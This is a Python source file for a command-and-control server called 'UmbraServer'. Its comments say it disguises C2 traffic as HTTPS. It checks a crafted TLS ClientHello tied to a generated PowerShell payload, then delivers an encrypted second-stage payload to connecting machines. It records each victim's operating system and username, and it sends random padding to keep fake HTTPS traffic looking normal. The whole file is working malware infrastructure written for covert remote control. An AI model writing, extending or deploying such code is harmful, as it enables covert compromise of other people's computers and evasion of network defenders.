from src.Utilities  import *
from src.TLS        import *
from src.Payload    import *
from src.TextAssets import *

import socket
import time
import random
import threading

# One solution for organization of server components and client accessibility is to
# use classes. Classes offer public memory addresses that can offer ease of use and
# a "standardized" organization of components.

class ServerComponents:
        def __init__(self) -> None:
                self.bind_agent         = None
                self.running            = False
                self.shutdown           = False
                self.identifier         = random.randbytes(32)

class ClientComponents:
        def __init__(self) -> None:
                self.connection         = None
                self.identifier         = None
                self.key                = None
                self.ip                 = None
                self.port               = None
                self.os                 = None
                self.user               = None
                self.thread             = None
                self.status             = "Active"
                self.in_use             = False
                self.pending            = b""

        # The payload executing on the client requests a new command every 2-9
        # seconds. To keep the look of a real HTTPS sever, we must respond to
        # the client upon request, regardless of status.

        @Public.Method
        def slake(self) -> None:
                while self.status == "Active":
                        if self.in_use:
                                time.sleep(0.1)
                                continue

                        if not self.peek():
                                time.sleep(0.1)
                                continue

                        self.ack()

                        # There is a chance the client sends data that we are
                        # unprepared for. If this is the case, save the data
                        # for when it is ready.

                        record                  = self.connection.recv(5)
                        length                  = int.from_bytes(record[3:])
                        cipher                  = self.connection.recv(length)
                        data                    = Payload.decrypt(cipher, self.key)

                        if data[0] != 0x03:
                                continue

                        self.pending           += data[1:]

        @Private.Method
        def peek(self) -> bool:
                try:
                        self.connection.recv(1, socket.MSG_PEEK)
                        return True
                except BlockingIOError:
                        return False
                except Exception:
                        self.status     = "Lost"
                        return False

        @Private.Method
        def ack(self) -> None:
                amount                  = random.randint(900, 1400)
                packed                  = b"\x01" + random.randbytes(amount)
                cipher                  = Payload.encrypt(packed, self.key)
                application             = Response.ApplicationData(cipher)
                self.connection.send(application)

# A professional attempt at remaining anonymized as well obfuscating traffic between
# a Command & Control server and a connected clients is to usera realistic server &
# client relationship.

# My scandalous approach is to use HTTPS (or what looks like...)

class UmbraServer:
        def __init__(self) -> None:
                self.server             = ServerComponents()
                self.clients            = {}
                self.client_manager     = None
                self.callback_ip        = None
                self.callback_port      = None
                self.time               = 2000

        @Public.Method
        def startup(self, bind_address: tuple[str, int]) -> bool:
                info("Starting server at https://0.0.0.0:{}.".format(bind_address[1]))
                local_bind              = socket.socket()
                
                try:
                        local_bind.bind(bind_address)
                except:
                        error("Failed to bind.")
                        return False

                local_bind.listen()

                server_thread           = threading.Thread(
                        target          = self.accept,
                        args            = (local_bind,),
                        daemon          = True
                )
                server_thread.start()

                self.server.bind_agent  = local_bind
                self.server.thread      = server_thread
                self.server.running     = True

                client_manager          = threading.Thread(
                        target          = self.client_manager,
                        daemon          = True
                )
                client_manager.start()

                return True

        @Public.Method
        def accept(self, listener: socket.socket) -> None:
                while not self.server.shutdown:
                        try:
                                client, address = listener.accept()
                        except Exception as exception:
                                debug("Exception: {}".format(exception))
                                break

                        client_verifier = threading.Thread(
                                target  = self.verify,
                                args    = (client,),
                                daemon  = True
                        )
                        client_verifier.start()

                self.server.running     = False
                self.server.shutdown    = False

        @Public.Method
        def verify(self, client: socket.socket) -> None:
                client.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, b"\x01\x00\x00\x00\x00\x00\x00\x00") # <- RST/ACK
                client.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # Linux and Windows flexibilty

                client.setblocking(False)
                client_key              = random.randbytes(1024)

                if not self.peek(client):
                        client.close()
                        return

                if not self.valid_request(client):
                        client.close()
                        return


                if not self.sent_payload(client, client_key):
                        client.close()
                        return

                tls                     = self.recvall(client, 5)

                if not tls:
                        client.close()
                        return

                length                  = int.from_bytes(tls[3:])
                data                    = self.recvall(client, length)
                data                    = Payload.decrypt(data, client_key)

                struct                  = ClientComponents()
                struct.connection       = client
                struct.identifier       = self.get_id()
                struct.key              = client_key
                client_address          = client.getpeername()
                struct.ip               = client_address[0]
                struct.port             = client_address[1]
                struct.os               = self.get_os(data).decode()
                struct.user             = self.get_user(data).decode()
                struct.thread           = threading.Thread(
                        target          = struct.slake,
                        daemon          = True
                )
                struct.thread.start()

                self.clients[struct.identifier] = struct
                success("New client [{}] verified. (type 'sessions' for more info)".format(green(struct.identifier)))

        @Private.Method
        def peek(self, connection: socket.socket) -> bool:
                try:
                        connection.recv(1, socket.MSG_PEEK)
                except ConnectionResetError:
                        return False
                except BlockingIOError:
                        return True
                except OSError:
                        return False

                return True

        # We are watching for a specific ClientHello in the TLS handshake. The
        # CLientHello random bytes header should be the exact bytes in the generated
        # powershell payload.

        @Private.Method
        def valid_request(self, client: socket.socket) -> bool:
                request                 = self.recvall(client, 50)
                request                 = int.from_bytes(request)
                request                 = Request(request)

                if not request.validity:
                        return False

                if request.client_hello.random != int.from_bytes(self.server.identifier):
                        return False

                return True

        @Private.Method
        def sent_payload(self, client: socket.socket, key: bytes) -> bool:
                client.send(Response.ServerHello(random.randbytes(32)))
                client.send(Response.ServerHelloDone())
                client.send(Response.ChangeCipherSpec())

                stage                   = Payload.stage()
                encrypted               = Payload.encrypt(stage, key)
                payload                 = key + encrypted

                client.sendall(Response.ApplicationData(payload))

                return True

        @Private.Method
        def get_id(self) -> str:
                return "-".join("".join(random.choices("ABCDEF0123456789", k=4)) for _ in range(3))

        @Private.Method
        def get_os(self, data: bytes) -> str:
                os_length               = int.from_bytes(data[0:2])
                os                      = data[2:2 + os_length]

                return os

        @Private.Method
        def get_user(self, data: bytes) -> str:
                user_start              = int.from_bytes(data[0:2])
                user                    = data[2 + user_start:]

                return user

        @Public.Method
        def client_manager(self) -> None:
                while True:
                        self.track_clients()
                        time.sleep(1)

        @Private.Method
        def track_clients(self) -> None:
                for client_id, client in self.clients.items():
                        connection      = client.connection

                        if client.status == "Lost":
                                continue

                        if client.in_use:
                                continue

                        if self.peek(connection):
                                continue

                        client.status   = "Lost"

        # Our client will be continuously checking if we have a command to execute.
        # We want something for our client to digest, while we are not in session
        # with the client to remain compliant with normal HTTP traffic.

        @Public.Method
        def kill(self) -> None:
                for client_id, client in self.clients.items():
                        client.connection.shutdown(socket.SHUT_WR)

                self.server.shutdown    = True
                self.server.bind_agent.close()

        @Private.Method
        def recvall(self, client: socket.socket, length: int) -> bytes:
                data                    = b""
                timer                   = self.start_timer()

                while True:
                        if length == 0:
                                return data

                        if not timer.is_alive():
                                return data
                        try:
                                recv    = client.recv(length)
                                length -= len(recv)
                                data   += recv
                                timer   = self.start_timer()
                        except BlockingIOError:
                                continue
                        except ConnectionResetError:
                                break
                        except OSError:
                                break

                return data

        @Private.Method
        def start_timer(self) -> threading.Thread:
                timer                   = threading.Thread(
                        target          = self.timeout,
                        args            = (self.time,),
                        daemon          = True
                )
                timer.start()

                return timer


        @Public.Method
        def timeout(self, milliseconds: int) -> None:
                seconds                 = milliseconds / 1000
                time.sleep(seconds)

def main() -> None:
        server = UmbraServer()
        server.server.identifier = bytes(bytearray(0 for _ in range(32)))
        server.startup(("127.0.0.1", 443))
        print(Payload.base_64(Response.ClientHello(server.server.identifier)))
        
        while True:
                pass

if __name__ == "__main__":
        main()